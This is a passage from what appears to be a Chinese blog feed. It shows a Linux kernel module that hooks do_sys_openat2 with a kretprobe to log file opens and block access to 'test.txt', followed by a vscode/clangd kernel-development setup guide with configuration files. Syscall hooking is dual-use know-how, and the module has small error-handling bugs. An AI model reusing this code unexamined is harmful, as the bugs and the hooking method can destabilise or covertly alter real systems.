class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/binfmts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/delay.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/device.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/file.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs_struct.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kprobes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/miscdevice.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;CyberSecurity&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DBGINFO(m, ...) pr_debug(KBUILD_MODNAME <span class="string">&quot;-dbg: &quot;</span> m <span class="string">&quot;\n&quot;</span>, ##__VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DBGINFO(m, ...)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">kretprobe</span> <span class="title">kp</span> =</span> &#123;</span><br><span class="line">    .kp.symbol_name = <span class="string">&quot;do_sys_openat2&quot;</span>,</span><br><span class="line">    .data_size = PATH_MAX <span class="comment">//kretprobe私有数据,方便在不同函数间传递数据</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">handler_pre</span><span class="params">(<span class="keyword">struct</span> kretprobe_instance *p, <span class="keyword">struct</span> pt_regs *regs)</span> <span class="comment">//注意,结构和kprobe稍微有点不一样</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>                  slen        = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span>                *filename    = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *ps_cwd      = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *__user   us_filename = (<span class="type">const</span> <span class="type">void</span> *)regs-&gt;si; <span class="comment">// gcc x64 约定 rsi 为第二个参数</span></span><br><span class="line">    <span class="keyword">if</span> (IS_ERR_OR_NULL(us_filename))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    slen = strnlen_user(us_filename, PATH_MAX); <span class="comment">// strlen 内核版 , 用户空间的东西都需要单独操作,内核不可直接访问用户空间</span></span><br><span class="line">    <span class="keyword">if</span> (!slen || slen &gt; PATH_MAX)</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    filename = kzalloc(slen + <span class="number">1</span>, GFP_ATOMIC);</span><br><span class="line">    <span class="keyword">if</span> (PTR_ERR_OR_ZERO(filename))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(filename, us_filename, slen))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(filename, <span class="string">&quot;/run&quot;</span>) != <span class="literal">NULL</span> || <span class="built_in">strstr</span>(filename, <span class="string">&quot;/proc&quot;</span>) != <span class="literal">NULL</span>) <span class="comment">//过滤非必要文件</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memcpy</span>(p-&gt;data, filename, slen);</span><br><span class="line">    ps_cwd = current-&gt;mm-&gt;owner-&gt;fs-&gt;pwd.dentry-&gt;d_name.name; <span class="comment">//获取程序执行目录,注意,openat参数为相对目录时需要自己拼接程序执行目录才能得到绝对路径</span></span><br><span class="line">    DBGINFO(<span class="string">&quot;OPEN AT %s By PID:%d,CWD:%s&quot;</span>, filename, current-&gt;mm-&gt;owner-&gt;pid, ps_cwd);</span><br><span class="line">    kfree(filename);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">close_fd</span><span class="params">(<span class="type">unsigned</span> fd)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">handler_post</span><span class="params">(<span class="keyword">struct</span> kretprobe_instance *ri, <span class="keyword">struct</span> pt_regs *regs)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *filename = ri-&gt;data;</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR_OR_NULL(filename))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(filename, <span class="string">&quot;test.txt&quot;</span>) == <span class="number">0</span>) <span class="comment">//修改openat返回值 达到保护目的</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> fd = regs_return_value(regs);</span><br><span class="line">        close_fd(fd);</span><br><span class="line">        regs_set_return_value(regs, -EBADF);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __init <span class="type">int</span> <span class="title function_">kprobe_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    kp.handler       = handler_post;</span><br><span class="line">    kp.entry_handler = handler_pre;</span><br><span class="line">    ret              = register_kretprobe(&amp;kp);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;register_kprobe failed, returned %d\n&quot;</span>, ret);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">&quot;Planted return probe at %s: %p\n&quot;</span>,</span><br><span class="line">           kp.kp.symbol_name, kp.kp.addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> __exit <span class="type">void</span> <span class="title function_">kprobe_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    unregister_kretprobe(&amp;kp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(kprobe_init);</span><br><span class="line">module_exit(kprobe_exit);</span><br></pre></td></tr></table></figure><h4 id="演示"><a href="#演示" class="headerlink" title="演示:"></a>演示:</h4><p>测试环境:<code>Ubuntu 22.04 5.15.0-46-generic</code></p><p><img src="/6d188cabc922/1.png" alt="加载驱动前"><br><img src="/6d188cabc922/2.png" alt="加载驱动后"><br><img src="/6d188cabc922/3.png" alt="日志"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 内核 </tag>
            
            <tag> Hook </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用vscode+clangd 进行内核代码阅读/开发</title>
      <link href="/b766795a58e5/"/>
      <url>/b766795a58e5/</url>
      
        <content type="html"><![CDATA[<h2 id="开发环境搭建"><a href="#开发环境搭建" class="headerlink" title="开发环境搭建"></a>开发环境搭建</h2><p>由于linux内核代码&#x2F;头文件最好都放在linux环境下开发测试,在Mac下开发不太方便,记录一下使用vscode + remote ssh 进行远程开发</p><ol><li>vscode 安装插件 <code>Remote - SSH</code> 方便连接到linux机器,注意,<font color="#ce1616">linux机器不要用docker</font>,自己搭一个虚拟机或者物理机器,方便双机调试</li><li>vscode 会自动把 远程服务需要的文件传到linux机器下 所以请配置 ssh 的免密码登录,否则每次打开工程都需要输密码,很麻烦,保证机器至少有100m的空间用来存放vscode远程开发的插件&#x2F;配置等文件</li><li>linux 机器安装 <code>clangd</code> ubuntu下使用 <code>sudo apt install clangd</code>,最好也把<code>clang</code>也安装上,因为代码提示都是靠llvm 编译出的IR来进行AST分析,实现代码提示功能的</li><li>linux 机器安装 <code>bear</code> ubuntu下使用 <code>sudo apt install bear</code> 这个是用来自动生成 <code>compile_commands.json</code> 这个文件来配置<code>clangd</code></li><li>vscode 配置 linux机器的<code>clangd</code>,给linux机器装上<code>clangd</code> 插件,配置如下:<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;clangd.arguments&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">  <span class="string">&quot;--background-index&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;--completion-style=detailed&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;--header-insertion=never&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;-log=info&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;--pretty&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;--clang-tidy&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;--header-insertion=iwyu&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;--compile-commands-dir=$&#123;workspaceFolder&#125;&quot;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure></li><li>在<code>$&#123;workspaceFolder&#125;</code> 也就是你使用vscode 打开文件夹的目录下新建 <code>.clangd</code> 文件配置详细工作内容,配置如下:<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">CompileFlags:</span> </span><br><span class="line">  <span class="attr">Add:</span></span><br><span class="line">  [</span><br><span class="line">    <span class="string">&quot;-I/usr/src/linux-headers-5.15.0-46/&quot;</span>, <span class="comment"># 配置linux源码目录</span></span><br><span class="line">    <span class="string">&quot;-I./include&quot;</span>, <span class="comment"># 配置包含目录</span></span><br><span class="line">    <span class="string">&quot;-DDEBUG&quot;</span>, <span class="comment"># 配置宏,方便调试模式切换</span></span><br><span class="line">    <span class="string">&quot;-Wunused-result&quot;</span>, <span class="comment"># 配置 clang 参数</span></span><br><span class="line">  ]</span><br><span class="line">  <span class="attr">Remove:</span> <span class="comment"># 移除 clang 编译时的参数,因为clangd会使用compile_commands.json这个文件的编译参数,但是这个文件是gcc适用的,所以需要移除clang不适用的参数</span></span><br><span class="line">  [</span><br><span class="line">    <span class="string">&quot;-mpreferred-stack-boundary*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-mindirect-branch=thunk-extern&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-mindirect-branch-register&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-mfunction-return=thunk-extern&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-fno-allow-store-data-races&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-fconserve-stack&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-mrecord-mcount&quot;</span>,</span><br><span class="line">  ]</span><br><span class="line">  <span class="attr">Compiler:</span> <span class="string">clang</span> <span class="comment"># 注意,内核使用的是gcc来编译代码的,但是此处配置的是使用clang来编译llvm IR进行语法提示,两者是不一样的</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Diagnostics:</span></span><br><span class="line">  <span class="attr">ClangTidy:</span></span><br><span class="line">    <span class="attr">CheckOptions:</span></span><br><span class="line">      <span class="attr">readability-identifier-naming.VariableCase:</span> <span class="string">CamelCase</span></span><br></pre></td></tr></table></figure></li><li>配置好<code>clangd</code>之后 还需要使用<code>bear</code>来自动生成内核编译时的参数,因为编译内核都是用<code>Makefile</code>来管理工程的,需要<code>bear</code>配合<code>clangd</code>才能进行自动完成等提示</li><li>在你的内核工程下执行<code>bear -- make</code>此时会生成一个<code>compile_commands.json</code>文件,里面记录了<code>make</code>命令执行过程中用到的所有参数</li></ol><h2 id="配置示例"><a href="#配置示例" class="headerlink" title="配置示例:"></a>配置示例:</h2><h4 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile:"></a>Makefile:</h4><p>用来生成内核文件.ko</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> KERNEL_VERSION = <span class="variable">$(<span class="built_in">shell</span> uname -r)</span></span><br><span class="line"><span class="keyword">export</span> KERNEL_DIR = /lib/modules/<span class="variable">$(KERNEL_VERSION)</span>/build</span><br><span class="line"><span class="keyword">export</span> KERNEL_TOOL =/usr/src/linux-headers-<span class="variable">$(KERNEL_VERSION)</span>/scripts/</span><br><span class="line"></span><br><span class="line">obj-m := protect_openat.o <span class="comment"># 和源码名称一致</span></span><br><span class="line">ccflags-y :=-g -DDEBUG <span class="comment"># gcc 参数,注意Makefile的参数和clangd是不一样的,clangd只是用来进行语法提示,实际上编译文件还得靠gcc</span></span><br><span class="line"></span><br><span class="line"><span class="section">all:modules</span></span><br><span class="line"></span><br><span class="line"><span class="section">modules:</span></span><br><span class="line">@make -C <span class="variable">$(KERNEL_DIR)</span> M=$$PWD modules;</span><br></pre></td></tr></table></figure><h4 id="clang-format"><a href="#clang-format" class="headerlink" title=".clang-format:"></a>.clang-format:</h4><p>用来格式化&#x2F;美化代码</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Language:</span>        <span class="string">Cpp</span></span><br><span class="line"><span class="attr">BasedOnStyle:</span>  <span class="string">Google</span></span><br><span class="line"><span class="attr">AccessModifierOffset:</span> <span class="number">-4</span></span><br><span class="line"><span class="attr">AlignAfterOpenBracket:</span> <span class="string">Align</span></span><br><span class="line"><span class="attr">AlignConsecutiveMacros:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">AlignConsecutiveAssignments:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">AlignConsecutiveBitFields:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">AlignConsecutiveDeclarations:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">AlignEscapedNewlines:</span> <span class="string">Right</span></span><br><span class="line"><span class="attr">AlignOperands:</span>   <span class="string">Align</span></span><br><span class="line"><span class="attr">AlignTrailingComments:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">AllowAllArgumentsOnNextLine:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">AllowAllConstructorInitializersOnNextLine:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">AllowAllParametersOfDeclarationOnNextLine:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">AllowShortEnumsOnASingleLine:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">AllowShortBlocksOnASingleLine:</span> <span class="string">Never</span></span><br><span class="line"><span class="attr">AllowShortCaseLabelsOnASingleLine:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">AllowShortFunctionsOnASingleLine:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">AllowShortLambdasOnASingleLine:</span> <span class="string">All</span></span><br><span class="line"><span class="attr">AllowShortIfStatementsOnASingleLine:</span> <span class="string">Never</span></span><br><span class="line"><span class="attr">AllowShortLoopsOnASingleLine:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">AlwaysBreakAfterDefinitionReturnType:</span> <span class="string">None</span></span><br><span class="line"><span class="attr">AlwaysBreakAfterReturnType:</span> <span class="string">None</span></span><br><span class="line"><span class="attr">AlwaysBreakBeforeMultilineStrings:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">AlwaysBreakTemplateDeclarations:</span> <span class="string">MultiLine</span></span><br><span class="line"><span class="attr">BinPackArguments:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">BinPackParameters:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">BraceWrapping:</span></span><br><span class="line">  <span class="attr">AfterCaseLabel:</span>  <span class="literal">false</span></span><br><span class="line">  <span class="attr">AfterClass:</span>      <span class="literal">false</span></span><br><span class="line">  <span class="attr">AfterControlStatement:</span> <span class="string">Never</span></span><br><span class="line">  <span class="attr">AfterEnum:</span>       <span class="literal">false</span></span><br><span class="line">  <span class="attr">AfterFunction:</span>   <span class="literal">false</span></span><br><span class="line">  <span class="attr">AfterNamespace:</span>  <span class="literal">false</span></span><br><span class="line">  <span class="attr">AfterObjCDeclaration:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">AfterStruct:</span>     <span class="literal">false</span></span><br><span class="line">  <span class="attr">AfterUnion:</span>      <span class="literal">false</span></span><br><span class="line">  <span class="attr">AfterExternBlock:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">BeforeCatch:</span>     <span class="literal">false</span></span><br><span class="line">  <span class="attr">BeforeElse:</span>      <span class="literal">false</span></span><br><span class="line">  <span class="attr">BeforeLambdaBody:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">BeforeWhile:</span>     <span class="literal">false</span></span><br><span class="line">  <span class="attr">IndentBraces:</span>    <span class="literal">false</span></span><br><span class="line">  <span class="attr">SplitEmptyFunction:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">SplitEmptyRecord:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">SplitEmptyNamespace:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">BreakBeforeBinaryOperators:</span> <span class="string">None</span></span><br><span class="line"><span class="attr">BreakBeforeBraces:</span> <span class="string">Allman</span></span><br><span class="line"><span class="attr">BreakBeforeInheritanceComma:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">BreakInheritanceList:</span> <span class="string">BeforeColon</span></span><br><span class="line"><span class="attr">BreakBeforeTernaryOperators:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">BreakConstructorInitializersBeforeComma:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">BreakConstructorInitializers:</span> <span class="string">BeforeColon</span></span><br><span class="line"><span class="attr">BreakAfterJavaFieldAnnotations:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">BreakStringLiterals:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">ColumnLimit:</span>     <span class="number">0</span></span><br><span class="line"><span class="attr">CommentPragmas:</span>  <span class="string">&#x27;^ IWYU pragma:&#x27;</span></span><br><span class="line"><span class="attr">CompactNamespaces:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">ConstructorInitializerAllOnOneLineOrOnePerLine:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">ConstructorInitializerIndentWidth:</span> <span class="number">4</span></span><br><span class="line"><span class="attr">ContinuationIndentWidth:</span> <span class="number">4</span></span><br><span class="line"><span class="attr">Cpp11BracedListStyle:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">DeriveLineEnding:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">DerivePointerAlignment:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">DisableFormat:</span>   <span class="literal">false</span></span><br><span class="line"><span class="attr">ExperimentalAutoDetectBinPacking:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">FixNamespaceComments:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">ForEachMacros:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">foreach</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Q_FOREACH</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">BOOST_FOREACH</span></span><br><span class="line"><span class="attr">IncludeBlocks:</span>   <span class="string">Preserve</span></span><br><span class="line"><span class="attr">IncludeCategories:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">Regex:</span>           <span class="string">&#x27;^&quot;(llvm|llvm-c|clang|clang-c)/&#x27;</span></span><br><span class="line">    <span class="attr">Priority:</span>        <span class="number">2</span></span><br><span class="line">    <span class="attr">SortPriority:</span>    <span class="number">0</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">Regex:</span>           <span class="string">&#x27;^(&lt;|&quot;(gtest|gmock|isl|json)/)&#x27;</span></span><br><span class="line">    <span class="attr">Priority:</span>        <span class="number">3</span></span><br><span class="line">    <span class="attr">SortPriority:</span>    <span class="number">0</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">Regex:</span>           <span class="string">&#x27;.*&#x27;</span></span><br><span class="line">    <span class="attr">Priority:</span>        <span class="number">1</span></span><br><span class="line">    <span class="attr">SortPriority:</span>    <span class="number">0</span></span><br><span class="line"><span class="attr">IncludeIsMainRegex:</span> <span class="string">&#x27;(Test)?$&#x27;</span></span><br><span class="line"><span class="attr">IncludeIsMainSourceRegex:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="attr">IndentCaseLabels:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">IndentCaseBlocks:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">IndentGotoLabels:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">IndentPPDirectives:</span> <span class="string">None</span></span><br><span class="line"><span class="attr">IndentExternBlock:</span> <span class="string">AfterExternBlock</span></span><br><span class="line"><span class="attr">IndentWidth:</span>     <span class="number">4</span></span><br><span class="line"><span class="attr">IndentWrappedFunctionNames:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">InsertTrailingCommas:</span> <span class="string">None</span></span><br><span class="line"><span class="attr">JavaScriptQuotes:</span> <span class="string">Leave</span></span><br><span class="line"><span class="attr">JavaScriptWrapImports:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">KeepEmptyLinesAtTheStartOfBlocks:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">MacroBlockBegin:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="attr">MacroBlockEnd:</span>   <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="attr">MaxEmptyLinesToKeep:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">NamespaceIndentation:</span> <span class="string">None</span></span><br><span class="line"><span class="attr">ObjCBinPackProtocolList:</span> <span class="string">Auto</span></span><br><span class="line"><span class="attr">ObjCBlockIndentWidth:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">ObjCBreakBeforeNestedBlockParam:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">ObjCSpaceAfterProperty:</span> <span class="literal">false</span></span><br><span class="line"><span 